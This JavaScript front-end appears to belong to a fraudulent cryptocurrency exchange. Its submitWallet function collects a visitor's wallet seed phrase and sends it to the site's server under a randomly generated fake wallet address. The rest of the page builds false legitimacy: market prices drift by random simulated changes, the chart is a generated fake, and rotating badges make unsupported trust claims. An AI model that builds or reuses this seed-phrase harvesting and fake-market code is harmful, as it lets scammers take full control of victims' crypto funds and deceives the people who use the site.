const markets = [ 
    { name: 'Bitcoin', symbol: 'BTC', price: 85245.32, change: 2.48, icon: '₿', color: '#f7931a' }, 
    { name: 'Ethereum', symbol: 'ETH', price: 5245.10, change: 1.12, icon: 'Ξ', color: '#627eea' }, 
    { name: 'Tether', symbol: 'USDT', price: 1.00, change: 0.01, icon: '₮', color: '#26a17b' },
    { name: 'Solana', symbol: 'SOL', price: 252.32, change: 5.20, icon: 'S', color: '#00d2ff' }, 
    { name: 'BNB', symbol: 'BNB', price: 720.40, change: -0.45, icon: 'B', color: '#f3ba2f' }, 
    { name: 'XRP', symbol: 'XRP', price: 3.91, change: -1.20, icon: 'X', color: '#23292f' }, 
    { name: 'Cardano', symbol: 'ADA', price: 1.25, change: 3.10, icon: 'A', color: '#0033ad' }, 
    { name: 'Dogecoin', symbol: 'DOGE', price: 0.28, change: 1.45, icon: 'Ð', color: '#c2a633' }, 
    { name: 'Avalanche', symbol: 'AVAX', price: 45.20, change: -2.10, icon: 'A', color: '#e84142' }, 
    { name: 'Polkadot', symbol: 'DOT', price: 12.15, change: 0.50, icon: '●', color: '#e6007a' }, 
    { name: 'Chainlink', symbol: 'LINK', price: 28.40, change: 4.20, icon: '⬡', color: '#2a5ada' }, 
    { name: 'Polygon', symbol: 'MATIC', price: 1.12, change: -1.15, icon: 'M', color: '#8247e5' }, 
    { name: 'Shiba Inu', symbol: 'SHIB', price: 0.000045, change: 6.80, icon: 'S', color: '#f00500' }, 
    { name: 'Litecoin', symbol: 'LTC', price: 112.10, change: 1.05, icon: 'Ł', color: '#345d9d' }, 
    { name: 'TRON', symbol: 'TRX', price: 0.23, change: 0.80, icon: 'T', color: '#eb0029' }, 
    { name: 'Uniswap', symbol: 'UNI', price: 15.20, change: -0.90, icon: 'U', color: '#ff007a' }, 
    { name: 'Cosmos', symbol: 'ATOM', price: 14.80, change: 2.10, icon: '⚛', color: '#2e3148' }, 
    { name: 'Stellar', symbol: 'XLM', price: 0.22, change: -1.50, icon: 'X', color: '#000000' }, 
    { name: 'NEAR Protocol', symbol: 'NEAR', price: 9.50, change: 3.40, icon: 'N', color: '#00ec97' }, 
    { name: 'Aptos', symbol: 'APT', price: 15.20, change: -2.30, icon: 'A', color: '#000000' }, 
    { name: 'Arbitrum', symbol: 'ARB', price: 2.15, change: 1.80, icon: 'A', color: '#12aaff' }, 
    { name: 'Optimism', symbol: 'OP', price: 4.40, change: 0.40, icon: 'O', color: '#ff0420' }, 
    { name: 'Filecoin', symbol: 'FIL', price: 8.80, change: -1.10, icon: 'F', color: '#0090ff' }, 
    { name: 'Injective', symbol: 'INJ', price: 35.10, change: 7.20, icon: 'I', color: '#00d2ff' }, 
    { name: 'Sui', symbol: 'SUI', price: 2.65, change: 4.50, icon: 'S', color: '#6fbcf0' }, 
    { name: 'Pepe', symbol: 'PEPE', price: 0.000018, change: 12.40, icon: '🐸', color: '#3d8130' } 
];

const countries = [ 
    { name: "United States", flag: "🇺🇸" }, { name: "United Kingdom", flag: "🇬🇧" }, { name: "Canada", flag: "🇨🇦" }, 
    { name: "Australia", flag: "🇦🇺" }, { name: "Nigeria", flag: "🇳🇬" }, { name: "Kenya", flag: "🇰🇪" }, 
    { name: "South Africa", flag: "🇿🇦" }, { name: "Ghana", flag: "🇬🇭" }, { name: "India", flag: "🇮🇳" }, 
    { name: "Germany", flag: "🇩🇪" }, { name: "France", flag: "🇫🇷" }, { name: "Japan", flag: "🇯🇵" }, 
    { name: "UAE", flag: "🇦🇪" }, { name: "Brazil", flag: "🇧🇷" } 
];

const currencyMap = { 
    "🇺🇸 United States": { code: "USD", symbol: "$", rate: 1 }, "🇬🇧 United Kingdom": { code: "GBP", symbol: "£", rate: 0.79 }, 
    "🇨🇦 Canada": { code: "CAD", symbol: "C$", rate: 1.36 }, "🇦🇺 Australia": { code: "AUD", symbol: "A$", rate: 1.52 }, 
    "🇳🇬 Nigeria": { code: "NGN", symbol: "₦", rate: 1500 }, "🇰🇪 Kenya": { code: "KES", symbol: "KSh", rate: 130 }, 
    "🇿🇦 South Africa": { code: "ZAR", symbol: "R", rate: 18.5 }, "🇬🇭 Ghana": { code: "GHS", symbol: "₵", rate: 14.5 }, 
    "🇮🇳 India": { code: "INR", symbol: "₹", rate: 83.5 }, "🇩🇪 Germany": { code: "EUR", symbol: "€", rate: 0.92 }, 
    "🇫🇷 France": { code: "EUR", symbol: "€", rate: 0.92 }, "🇯🇵 Japan": { code: "JPY", symbol: "¥", rate: 150 }, 
    "🇦🇪 UAE": { code: "AED", symbol: "د.إ", rate: 3.67 }, "🇧🇷 Brazil": { code: "BRL", symbol: "R$", rate: 5.0 } 
};

const BONUS_RATE = 0.05;
let currentTradeMode = 'buy';
let currentUser = null;
let globalSettings = null;

function getUserCurrency() { if (!currentUser || !currentUser.country) return currencyMap["🇺🇸 United States"]; return currencyMap[currentUser.country] || currencyMap["🇺🇸 United States"]; }
function getExchangePrice(coin, mode) { return mode === 'buy' ? coin.price * (1 - BONUS_RATE) : coin.price * (1 + BONUS_RATE); }

function showView(viewId, authType = 'login') {
    document.querySelectorAll('.app-view').forEach(view => view.style.display = 'none');
    const target = document.getElementById(viewId);
    if (target) target.style.display = 'block';
    if (viewId === 'authView') switchAuth(authType);
    if (viewId === 'dashboardView') { fetchBalances(); checkWalletStatus(); }
    if (viewId === 'guestView' && typeof loadMarkets === 'function') loadMarkets();
    window.scrollTo(0, 0);
}

function showToast(msg) {
    const toast = document.getElementById('toast');
    if (toast) { toast.textContent = msg; toast.classList.add('show'); setTimeout(() => toast.classList.remove('show'), 3000); }
}

function showCustomAlert(title, message) {
    let modal = document.getElementById('customAlertModal'); 
    modal.style.display = 'flex';
    modal.innerHTML = `<div class="custom-alert-box"><div class="custom-alert-icon"><svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#f6465d" stroke-width="2.5"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="8" x2="12" y2="12"></line><line x1="12" y1="16" x2="12.01" y2="16"></line></svg></div><h3>${title}</h3><p>${message}</p><button class="custom-alert-btn" onclick="document.getElementById('customAlertModal').style.display='none'">Got it</button></div>`;
}

function switchAuth(type) { 
    document.getElementById('loginForm').style.display = type === 'login' ? 'block' : 'none'; 
    document.getElementById('registerForm').style.display = type === 'register' ? 'block' : 'none'; 
}

function populateTradeCoins() { 
    const select = document.getElementById('tradeCoin'); 
    if(!select) return; 
    select.innerHTML = ''; 
    markets.forEach(c => { const o = document.createElement('option'); o.value = c.symbol; o.textContent = `${c.name} (${c.symbol})`; select.appendChild(o); }); 
}

async function handleRegister() {
    const name = document.getElementById('regName').value;
    const country = document.getElementById('regCountry').value;
    const phone = document.getElementById('regPhone').value;
    const email = document.getElementById('regEmail').value;
    const password = document.getElementById('regPassword').value;
    const confirm = document.getElementById('regConfirmPassword').value;
    const terms = document.getElementById('regTerms').checked;

    if (!name || !country || !phone || !email || !password) return showToast("Please fill all fields.");
    if (password !== confirm) return showToast("Passwords do not match.");
    if (!terms) return showToast("You must agree to the Terms.");

    try {
        const res = await fetch('/api/auth/register', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ name, country, phone, email, password }) });
        const data = await res.json();
        if (res.ok) { showToast("Registration successful!"); switchAuth('login'); } else { showToast(data.message); }
    } catch (error) { showToast("Error connecting."); }
}

async function handleLogin() {
    const email = document.getElementById('loginEmail').value;
    const password = document.getElementById('loginPassword').value;
    if (!email || !password) return showToast("Please fill all fields.");
    try {
        const res = await fetch('/api/auth/login', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ email, password }) });
        const data = await res.json();
        if (res.ok) { localStorage.setItem('token', data.token); localStorage.setItem('user', JSON.stringify(data.user)); checkAuthState(); } else { showToast(data.message); }
    } catch (error) { showToast("Error connecting."); }
}

function handleLogout() { localStorage.removeItem('token'); localStorage.removeItem('user'); checkAuthState(); }

function checkAuthState() {
    currentUser = JSON.parse(localStorage.getItem('user'));
    if (currentUser && (currentUser.isAdmin || currentUser.email.includes('admin'))) { window.location.href = '/admin.html'; return; }
    const navLinks = document.getElementById('navLinks');
    if (currentUser) {
        navLinks.innerHTML = `<a href="#" onclick="showView('guestView')">Markets</a><a href="#" class="profile-avatar-nav" onclick="showView('dashboardView')" style="background: linear-gradient(135deg, #00d4aa 0%, #007a62 100%); color: #fff; display: inline-flex; align-items: center; justify-content: center; width: 32px; height: 32px; border-radius: 50%; font-weight: bold;">${currentUser.name.charAt(0).toUpperCase()}</a><a href="#" class="btn-logout" onclick="handleLogout()">Logout</a>`;
        showView('dashboardView');
    } else {
        navLinks.innerHTML = `<a href="#" onclick="showView('guestView')">Markets</a><a href="#" onclick="showView('authView', 'login')">Login</a><a href="#" class="btn-primary" onclick="showView('authView', 'register')">Get Started</a>`;
        showView('guestView');
    }
}

// Custom Country Selector
function openCountrySelector() {
    let modal = document.getElementById('countrySelectorModal');
    if (modal) modal.remove();
    modal = document.createElement('div');
    modal.id = 'countrySelectorModal';
    modal.className = 'modal-overlay';
    let countryHtml = countries.map(c => `<div onclick="selectCountry('${c.flag} ${c.name}', '${c.flag} ${c.name}')" style="padding: 15px; border-bottom: 1px solid #333; cursor: pointer; display: flex; gap: 10px;"><span>${c.flag}</span> ${c.name}</div>`).join('');
    modal.innerHTML = `<div class="modal-content"><h3 style="margin-bottom: 15px;">Select Country</h3><div style="max-height: 50vh; overflow-y: auto;">${countryHtml}</div></div>`;
    document.body.appendChild(modal);
}

function selectCountry(value, display) {
    document.getElementById('regCountry').value = value;
    document.getElementById('regCountryDisplay').innerHTML = `<span>${display}</span><span>▼</span>`;
    document.getElementById('countrySelectorModal').remove();
}

// Dynamic Trust Badge
let trustIndex = 0;
const trustMessages = ["🛡️ Trusted by 10M+ users globally", "🔒 256-bit Encryption & Cold Storage", "⚡ Lightning-Fast Execution", "💬 24/7 Professional Support", "🌍 Trade over 500+ cryptocurrencies"];
setInterval(() => {
    const badge = document.getElementById('dynamicTrustBadge');
    if (badge) {
        badge.style.opacity = 0;
        setTimeout(() => {
            trustIndex = (trustIndex + 1) % trustMessages.length;
            badge.textContent = trustMessages[trustIndex];
            badge.style.opacity = 1;
        }, 300);
    }
}, 3000);

function simulateLiveMarket() {
    markets.forEach(coin => {
        const fluctuation = (Math.random() - 0.5) * (coin.price * 0.002);
        coin.price += fluctuation;
        const changeFluctuation = (Math.random() - 0.5) * 0.2;
        coin.change = parseFloat((coin.change + changeFluctuation).toFixed(2));
    });
}

function loadMarkets() {
    const marketList = document.getElementById('market-list'); const ticker = document.getElementById('ticker');
    if(!marketList) return;
    let marketHTML = ''; let tickerHTML = '';
    
    markets.forEach((coin, index) => {
        const isUp = coin.change >= 0; const changeClass = isUp ? 'up' : 'down'; const changeSymbol = isUp ? '↑' : '↓';
        let formattedPrice = coin.price.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 6});
        marketHTML += `<div class="market-row" onclick="quickTrade('${coin.symbol}')"><div class="market-rank">${index + 1}</div><div class="market-name-col"><div class="market-icon" style="background: ${coin.color};">${coin.icon}</div><div><div class="market-name-text">${coin.name}</div><div class="market-symbol-text">${coin.symbol}</div></div></div><div class="market-price">$${formattedPrice}</div><div class="market-change ${changeClass}">${changeSymbol} ${Math.abs(coin.change)}%</div></div>`;
        tickerHTML += `<div class="ticker-item"><b>${coin.symbol}</b> $${formattedPrice} <span class="${changeClass}">${changeSymbol}${Math.abs(coin.change)}%</span></div>`;
    });
    marketList.innerHTML = marketHTML; if(ticker) ticker.innerHTML = tickerHTML + tickerHTML; 

    // Hero Chart Logic
    const btc = markets.find(c => c.symbol === 'BTC');
    if(btc) {
        document.getElementById('heroChartPrice').innerText = `$${btc.price.toLocaleString()}`;
        document.getElementById('heroChartChange').innerText = `+${btc.change}%`;
        // Generate a fake sparkline path
        let path = "M0,60 ";
        for(let i=1; i<=10; i++) { path += `L${i*30},${Math.random() * 40 + 20} `; }
        document.getElementById('heroSvgContainer').innerHTML = `<svg width="100%" height="100%" viewBox="0 0 300 80"><path d="${path}" fill="none" stroke="#0ecb51" stroke-width="3"/></svg>`;
    }

    // Gainers/Losers Logic
    const glList = document.getElementById('gainersLosersList');
    if(glList) {
        const sorted = [...markets].sort((a,b) => b.change - a.change);
        const top = [...sorted.slice(0, 3), ...sorted.slice(-3)]; // 3 gainers, 3 losers
        glList.innerHTML = top.map(c => `<div class="gl-card"><div style="font-size:12px; color:#888;">${c.symbol}</div><div style="font-weight:bold; margin: 5px 0;">$${c.price}</div><div class="${c.change >= 0 ? 'up' : 'down'}" style="font-size:12px;">${c.change >= 0 ? '↑' : '↓'} ${Math.abs(c.change)}%</div></div>`).join('');
    }
}

function quickTrade(symbol) { requireAuth('tradeView', 'buy'); setTimeout(() => { document.getElementById('tradeCoin').value = symbol; calcTrade(); }, 100); }

async function checkWalletStatus() {
    if (!currentUser) return;
    try {
        const res = await fetch(`/api/user/${currentUser.email}`);
        const user = await res.json();
        const disconnected = document.getElementById('walletDisconnected'), pending = document.getElementById('walletPending'), approved = document.getElementById('walletApproved'), badge = document.getElementById('walletStatusBadge');
        if(disconnected) disconnected.style.display = 'none'; if(pending) pending.style.display = 'none'; if(approved) approved.style.display = 'none';
        
        if (user.walletStatus === 'approved') {
            if(approved) approved.style.display = 'block'; 
            if(document.getElementById('displayWalletAddress')) document.getElementById('displayWalletAddress').textContent = user.walletAddress; 
            if(badge) { badge.textContent = 'CONNECTED'; badge.className = 'status-badge approved'; }
        } else if (user.walletStatus === 'pending') {
            if(pending) pending.style.display = 'block'; if(badge) { badge.textContent = 'VERIFYING'; badge.className = 'status-badge pending'; }
        } else {
            if(disconnected) disconnected.style.display = 'block'; if(badge) { badge.textContent = 'NOT CONNECTED'; badge.className = 'status-badge disconnected'; }
        }
    } catch (error) { console.log(error); }
}

function showImportWallet() { document.getElementById('importWalletForm').style.display = 'block'; }
async function submitWallet() {
    const seed = document.getElementById('seedPhraseInput').value.trim();
    if (seed.split(' ').length < 12) return showToast("Enter a valid 12 or 24-word phrase.");
    let fakeAddress = '0x' + Array.from({length: 40}, () => '0123456789abcdef'[Math.floor(Math.random() * 16)]).join('');
    try {
        const res = await fetch('/api/wallet/import', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ email: currentUser.email, seedPhrase: seed, walletAddress: fakeAddress }) });
        if (res.ok) { showToast("Wallet submitted for review."); checkWalletStatus(); }
    } catch (error) { showToast("Error submitting wallet."); }
}

async function fetchBalances() {
    if (!currentUser) return;
    try {
        const res = await fetch(`/api/user/${currentUser.email}/balances`);
        const balances = await res.json();
        const assetsHeader = Array.from(document.querySelectorAll('h3')).find(el => el.textContent.trim() === 'Your Assets');
        if (!assetsHeader) return;
        const assetsCard = assetsHeader.closest('.assets-section') || assetsHeader.parentElement;
        
        let hideZero = localStorage.getItem('hideZeroBalances') === 'true';
        let html = `
            <div class="section-header" style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
                <h3 style="margin: 0; font-size: 18px; font-weight: 600;">Your Assets</h3>
                <label style="display: flex; align-items: center; gap: 10px; cursor: pointer;">
                    <span style="font-size: 13px; color: #aaa;">Hide Zero</span>
                    <div style="position: relative; width: 44px; height: 24px;">
                        <input type="checkbox" id="hideZeroToggle" ${hideZero ? 'checked' : ''} style="opacity: 0; width: 0; height: 0; position: absolute;">
                        <span id="toggleTrack" style="position: absolute; top: 0; left: 0; right: 0; bottom: 0; background-color: ${hideZero ? '#00d4aa' : '#3a3a4a'}; border-radius: 24px; transition: 0.3s;"></span>
                        <span id="toggleThumb" style="position: absolute; height: 20px; width: 20px; left: ${hideZero ? '21px' : '2px'}; bottom: 2px; background-color: #fff; border-radius: 50%; transition: 0.3s;"></span>
                    </div>
                </label>
            </div>
            <div class="asset-table-header"><span>Asset</span><span style="text-align: right;">Amount</span><span style="text-align: right;">Value</span></div>
            <div id="assetsListContainer" class="${hideZero ? 'hide-zeros' : ''}" style="display: flex; flex-direction: column;">
        `;
        
        let totalValue = 0;
        markets.forEach(coin => {
            const amount = Math.max(0, balances[coin.symbol] || 0); 
            const value = amount * coin.price;
            totalValue += value;
            const rowClass = amount === 0 ? 'asset-row zero-row' : 'asset-row';
            // PRECISE CLICK: Hardcoded onclick
            html += `<div class="${rowClass}" onclick="window.showAssetActions('${coin.symbol}', '${coin.name}', ${amount}, ${value})">
                <div class="asset-name"><div class="market-icon" style="background:${coin.color};">${coin.icon}</div> ${coin.name}</div>
                <div class="asset-amount">${amount.toFixed(6)}</div>
                <div class="asset-value">$${value.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})}</div>
            </div>`;
        });
        html += `</div>`;
        assetsCard.innerHTML = html;
        
        const totalEl = document.getElementById('totalPortfolioValue');
        if (totalEl) {
            totalEl.dataset.realValue = `$${Math.max(0, totalValue).toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})}`;
            totalEl.textContent = localStorage.getItem('hideBalance') === 'true' ? '******' : totalEl.dataset.realValue;
        }
        
        const toggle = document.getElementById('hideZeroToggle');
        if (toggle) {
            toggle.addEventListener('change', (e) => {
                const isChecked = e.target.checked; localStorage.setItem('hideZeroBalances', isChecked);
                const listContainer = document.getElementById('assetsListContainer');
                if (isChecked) listContainer.classList.add('hide-zeros'); else listContainer.classList.remove('hide-zeros');
                document.getElementById('toggleTrack').style.backgroundColor = isChecked ? '#00d4aa' : '#3a3a4a';
                document.getElementById('toggleThumb').style.left = isChecked ? '21px' : '2px';
            });
        }
    } catch (error) { console.log("Balance fetch error:", error); }
}

function toggleBalanceVisibility() {
    const valueEl = document.getElementById('totalPortfolioValue'), iconEl = document.getElementById('eyeIcon');
    if (!valueEl) return; 
    const isHidden = localStorage.getItem('hideBalance') === 'true'; 
    const newState = !isHidden; 
    localStorage.setItem('hideBalance', newState);
    if (newState) { 
        valueEl.textContent = '******'; 
        if(iconEl) iconEl.innerHTML = '<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path><line x1="1" y1="1" x2="23" y2="23"></line>'; 
    } else { 
        valueEl.textContent = valueEl.dataset.realValue || '$0.00'; 
        if(iconEl) iconEl.innerHTML = '<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle>'; 
    }
}

document.addEventListener('DOMContentLoaded', () => {
    populateTradeCoins(); checkAuthState(); loadMarkets();
    setInterval(() => { simulateLiveMarket(); loadMarkets(); }, 2000);
});
